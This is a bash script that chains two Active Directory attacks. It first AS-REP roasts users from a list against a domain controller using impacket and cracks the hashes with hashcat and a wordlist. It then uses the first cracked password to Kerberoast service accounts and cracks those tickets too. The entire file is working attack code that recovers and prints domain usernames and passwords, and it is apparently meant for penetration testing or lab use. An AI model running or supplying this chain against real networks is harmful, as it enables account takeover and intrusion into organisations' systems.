#!/usr/bin/env bash
set -euo pipefail

usage() {
    echo "Usage: $0 <dc> <userlist> <domain> [wordlist]" >&2
    exit 1
}

[[ $# -ge 3 ]] || usage

DC="$1"
USERLIST="$2"
DOMAIN="$3"
WORDLIST="${4:-/usr/share/wordlists/rockyou.txt}"

ASREP_HASHES="asrep_hashes.txt"
ASREP_CRACKED="asrep_cracked.txt"
TGS_HASHES="tgs_hashes.txt"
TGS_CRACKED="tgs_cracked.txt"

[[ -f "$USERLIST" && -r "$USERLIST" ]] || { echo "[-] Userlist not found: $USERLIST" >&2; exit 1; }
[[ -f "$WORDLIST" && -r "$WORDLIST" ]] || { echo "[-] Wordlist not found: $WORDLIST" >&2; exit 1; }

# Flush stale output so every run starts clean
rm -f "$ASREP_HASHES" "$ASREP_CRACKED" "$TGS_HASHES" "$TGS_CRACKED"

# ---------------------------------------------------------------------------
# Stage 1: AS-REP roast
# ---------------------------------------------------------------------------
echo "[*] AS-REP roasting $DOMAIN via $DC"
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile "$USERLIST" -no-pass -format hashcat 2>/dev/null \
    | grep '^\$krb5asrep\$' > "$ASREP_HASHES" || true

if [[ ! -s "$ASREP_HASHES" ]]; then
    echo "[-] No AS-REP roastable hashes found. Exiting."
    exit 0
fi

echo "[+] $(wc -l < "$ASREP_HASHES") hash(es) collected, cracking..."
hashcat -m 18200 "$ASREP_HASHES" "$WORDLIST" --potfile-disable -o "$ASREP_CRACKED" --quiet 2>/dev/null || true

if [[ ! -s "$ASREP_CRACKED" ]]; then
    echo "[-] No AS-REP hashes cracked. Exiting."
    exit 0
fi

user=""; password=""
while IFS= read -r line; do
    pw="${line##*:}"
    uh="${line%:*}"
    un="${uh#*\$23\$}"; un="${un%%@*}"
    echo "[+] AS-REP CRACKED  user=$un  password=$pw"
    # keep the FIRST pair for kerberoasting
    [[ -z "$user" ]] && { user="$un"; password="$pw"; }
done < "$ASREP_CRACKED"

echo "[*] Using creds for Kerberoast -> $user:$password"

# ---------------------------------------------------------------------------
# Stage 2: Kerberoast with the recovered creds
# ---------------------------------------------------------------------------
echo "[*] Requesting SPN tickets..."
impacket-GetUserSPNs "$DOMAIN/$user:$password" -dc-ip "$DC" -request -outputfile "$TGS_HASHES" 2>/dev/null || true

if [[ ! -s "$TGS_HASHES" ]]; then
    echo "[-] No kerberoastable SPNs returned for $user. Done."
    exit 0
fi

echo "[+] $(wc -l < "$TGS_HASHES") TGS hash(es) collected, cracking..."
hashcat -m 13100 "$TGS_HASHES" "$WORDLIST" --potfile-disable -o "$TGS_CRACKED" --quiet 2>/dev/null || true

if [[ ! -s "$TGS_CRACKED" ]]; then
    echo "[-] No TGS hashes cracked with $WORDLIST. Done."
    exit 0
fi

while IFS= read -r line; do
    pw="${line##*:}"
    uh="${line%:*}"
    un="${uh#*\$23\$\*}"; un="${un%%\$*}"   # TGS format: $krb5tgs$23$*user$DOMAIN$spn*...
    echo "[+] KERBEROAST CRACKED  user=$un  password=$pw"
    user="$un"; password="$pw"              # vars hold last kerberoasted pair
done < "$TGS_CRACKED"

echo "[*] Final vars -> user=${user:-<none>} password=${password:-<none>}"
